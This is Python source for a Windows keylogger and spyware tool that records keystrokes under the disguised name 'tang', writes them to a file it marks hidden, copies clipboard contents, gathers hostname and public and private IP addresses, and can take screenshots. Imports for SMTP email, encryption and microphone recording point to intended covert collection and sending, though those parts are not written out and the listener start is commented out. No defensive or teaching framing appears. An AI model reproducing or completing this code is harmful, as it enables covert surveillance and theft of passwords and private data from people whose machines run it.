########################################
# IMPORTS
########################################
import os
import ctypes
import subprocess
import sys
import threading

# email

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

# info

import time


# sound

from scipy.io.wavfile import write
import sounddevice as ad

# crypt

from cryptography.fernet import Fernet
# pass

import getpass
from requests import get

# screen

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
# Check if the `pynput` package is installed

########################################
# config
########################################

#subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
#subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
from pynput.keyboard import Key, Listener
# Hidden file attribute
FILE_ATTRIBUTE_HIDDEN = 0x02

# Tang press counter
count = 0

# List to store the pressed tang
tangs = []
sys_info = "syseminfo.txt"
clip_inf = "clip_inf.txt"
screen = "screen.png"
fil = "PATH"
extend = "\\"
########################################
# tang
########################################

# Callback function to handle tang press events


def computer_information():
    with open(fil + extend + sys_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

def copy_clipboard():
    with open(fil + extend + clip_inf, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(fil + extend + screen)

#screenshot()

copy_clipboard()

computer_information()
def on_press(tang):
    global tangs, count

    tangs.append(tang)
    count += 1

    # Print the pressed tang (optional)
    print("{0} pressed".format(tang))

    # If the number of presses reaches 10, write the tangs to file
    if count >= 10:
        count = 0
        write_file(tangs)
        tangs = []

# Callback function to handle tang release events
def on_release(tang):
    if tang == Key.esc:
        return False

# Write the pressed tangs to file
def write_file(tangs):
    # For *nix systems, add a '.' prefix to the file name
    prefix = '.' if os.name != 'nt' else ''
    file_name = prefix + 'tjo.txt'

    # Open the file in append mode and write the tangs
    with open(file_name, 'a') as file:
        for tang in tangs:
            tang = str(tang).replace("'","")
            # If the tang is space or enter, write a newline character
            if 'space' in tang or 'enter' in tang:
                file.write('\n')
            # If the tang is not recognized, write its value as is
            elif 'Key' not in tang:
                file.write(tang)

    # For Windows systems, set the file as hidden
    if os.name == 'nt':
        ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
        if not ret:
            raise ctypes.WinError()

########################################
# start
########################################

#with Listener(on_press=on_press, on_release=on_release) as listener:
   # listener.join()
